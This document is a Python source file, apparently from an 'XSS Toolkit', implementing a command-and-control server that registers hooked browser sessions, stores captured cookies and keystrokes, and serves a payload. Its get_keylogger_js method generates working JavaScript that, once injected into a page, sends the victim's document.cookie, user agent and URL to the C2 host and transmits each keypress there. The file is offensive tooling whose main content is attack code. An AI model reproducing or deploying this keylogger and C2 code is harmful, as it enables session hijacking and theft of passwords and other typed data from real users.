"""
XSS Toolkit — C2 Command & Control listener module.
"""

import os
import time
import secrets

from models import DataStore, Session, Keystroke


class C2Server:
    """Manages the C2 listener state and session/keystroke handling."""

    def __init__(self):
        self.store = DataStore()

    def start(self, host="127.0.0.1", port=9000, token=None):
        """Mark the C2 listener as active."""
        if not token:
            token = secrets.token_hex(16)
        self.store.c2_state.update({
            "running": True,
            "host": host,
            "port": port,
            "token": token,
        })
        self.store.add_activity("[*] C2 Listener started", "info")
        return {
            "status": "started",
            "host": host,
            "port": port,
            "token": token,
            "url": f"http://{host}:{port}/log",
        }

    def stop(self):
        """Mark the C2 listener as stopped."""
        self.store.c2_state["running"] = False
        self.store.add_activity("[!] C2 Listener stopped", "warn")
        return {"status": "stopped"}

    def get_status(self):
        """Return current C2 state + session count."""
        return {
            **self.store.c2_state,
            "session_count": len(self.store.sessions),
        }

    def validate_token(self, token):
        """Check if the provided token matches the active C2 token."""
        return (
            self.store.c2_state["running"]
            and token == self.store.c2_state["token"]
        )

    # ── Session management ────────────────────────────────────────────────────

    def register_session(self, ip, user_agent="", cookies=""):
        """Register or update a hooked browser session."""
        if not self.store.c2_state["running"]:
            return None
        session = Session(ip=ip, user_agent=user_agent, cookies=cookies)
        session = self.store.add_session(session)
        self.store.stats["sessions"] = len(self.store.sessions)
        self.store.add_activity(f"[+] New session: {ip}", "info")
        return session

    def get_sessions(self):
        """Return all active sessions."""
        return self.store.get_sessions()

    # ── Keystroke management ──────────────────────────────────────────────────

    def log_keystroke(self, session_id, ip, key):
        """Record a keystroke from a hooked session."""
        if not self.store.c2_state["running"]:
            return None
        ks = Keystroke(session_id=session_id, ip=ip, key=key)
        self.store.add_keystroke(ks)
        return ks

    def get_keystrokes(self, session_id=None):
        """Return captured keystrokes, optionally filtered by session."""
        return self.store.get_keystrokes(session_id)

    def clear_keystrokes(self):
        """Clear all keystrokes."""
        self.store.clear_keystrokes()

    # ── Payload server ────────────────────────────────────────────────────────

    def start_payload_server(self, port=8080):
        """Mark the payload server as active."""
        self.store.ps_state.update({"running": True, "port": port})
        self.store.add_activity(f"[*] Payload server started at :{port}", "info")
        return {
            "status": "started",
            "port": port,
            "url": f"http://127.0.0.1:{port}/keylogger.js",
        }

    def stop_payload_server(self):
        """Mark the payload server as stopped."""
        self.store.ps_state["running"] = False
        self.store.add_activity("[!] Payload server stopped", "warn")
        return {"status": "stopped"}

    def get_keylogger_js(self):
        """Generate the keylogger JavaScript payload dynamically."""
        c2 = self.store.c2_state
        log_url = f"http://{c2['host']}:{c2['port']}"
        token = c2["token"]

        return f"""// XSS Toolkit — Keylogger Payload
// Auto-generated — DO NOT distribute without authorization
(function() {{
    var LOG_URL = "{log_url}";
    var TOKEN = "{token}";

    // Session check-in
    function checkin() {{
        var xhr = new XMLHttpRequest();
        xhr.open("POST", LOG_URL + "/api/c2/log", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(JSON.stringify({{
            token: TOKEN,
            cookies: document.cookie,
            user_agent: navigator.userAgent,
            url: window.location.href
        }}));
    }}

    // Keystroke capture
    document.addEventListener("keypress", function(e) {{
        var xhr = new XMLHttpRequest();
        xhr.open("POST", LOG_URL + "/api/c2/keys", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(JSON.stringify({{
            token: TOKEN,
            key: e.key,
            url: window.location.href
        }}));
    }});

    checkin();
}})();
"""


# Singleton instance
c2_server = C2Server()
